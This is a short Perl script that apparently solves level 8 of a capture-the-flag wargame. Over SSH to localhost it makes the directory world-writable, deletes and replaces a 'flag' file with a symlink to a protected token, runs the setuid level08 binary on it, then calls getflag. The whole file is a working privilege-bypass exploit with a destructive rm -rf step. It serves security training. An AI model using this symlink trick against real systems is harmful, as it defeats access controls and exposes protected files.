#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level08";

$exploit = "chmod 777 . && rm -rf flag && ln -s token flag && ./level08 flag";
$ssh = "ssh -qp $port $user\@$ip '$exploit'";
print $red, $exploit, $reset, "\n";
print $green, `$ssh`, $reset;
system("ssh -qp $port flag08\@$ip 'getflag'");
